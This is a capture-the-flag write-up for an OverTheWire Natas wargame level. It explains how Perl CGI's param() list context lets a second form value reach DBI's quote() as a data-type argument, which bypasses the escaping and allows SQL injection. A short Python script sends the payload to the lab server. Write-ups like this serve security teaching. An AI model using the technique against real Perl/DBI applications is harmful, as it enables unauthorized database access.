# OverTheWire Natas: Level 29 → Level 30 Writeup

## Challenge Overview

Natas29 presents a simple login form that authenticates against a MySQL database using Perl's `DBI` module and the CGI `param()` function. The goal is to bypass the login logic and retrieve the password for the next level (`natas30`).

## Source Code

```perl

if ('POST' eq request_method && param('username') && param('password')){
    my $dbh = DBI->connect( "DBI:mysql:natas30","natas30", "<censored>", {'RaiseError' => 1});
    my $query="Select * FROM users where username =".$dbh->quote(param('username')) . " and password =".$dbh->quote(param('password'));

    my $sth = $dbh->prepare($query);
    $sth->execute();
    my $ver = $sth->fetch();
    if ($ver){
        print "win!<br>";
        print "here is your result:<br>";
        print @$ver;
    }
    else{
        print "fail :(";
    }
    $sth->finish();
    $dbh->disconnect();
}
```

At first glance, the code looks safe: it doesn't concatenate raw user input into the query. Instead it passes every parameter through `$dbh->quote()`, which is Perl DBI's built-in escaping function, specifically meant to prevent SQL injection.

## The Vulnerability

The bug isn't in the SQL construction, it's in **how `param()` behaves depending on calling context**, combined with a lesser-known feature of `DBI->quote()`.

Two key facts make this exploitable:

1. **`param()` context sensitivity**: When `param('password')` is called as an argument to another function (like `$dbh->quote(...)`), it is evaluated in **list context**. If the client submits *multiple* values for the same field name (`password`), `param()` returns *all* of them as a list, not just one.

2. **`DBI->quote()` optional second argument**: `quote()` actually accepts a second, optional parameter: `quote($value, $data_type)`. This second argument tells DBI what SQL data type to treat the value as. If a numeric/integer type is passed here, DBI can skip proper string-escaping and treat the value as a raw, unquoted literal because it assumes the caller already knows it's a safe numeric value.

Put together: if we send **two** values for the `password` field, Perl's `param('password')` returns both as a list, and that list gets passed straight into `$dbh->quote()` as `($value1, $value2)`. The first value becomes the string to quote, and the second value becomes the `$data_type` argument silently changing how `quote()` escapes (or doesn't escape) our input.

By choosing a second value that signals a numeric type, we cause `quote()` to skip proper escaping on the first value, letting us smuggle a raw SQL injection payload straight into the query.

## Solution

Run this script:

```python
import requests
from requests.auth import HTTPBasicAuth

basicAuth = HTTPBasicAuth('natas30', 'natas30_password')

u = "http://natas30.natas.labs.overthewire.org/index.pl"
params = {
    "username": "natas28",
    "password": ["'whatever' or 1", 4]
}

response = requests.post(u, data=params, auth=basicAuth, verify=False)
print(response.text)
```

The password for the next level can be found in the content.

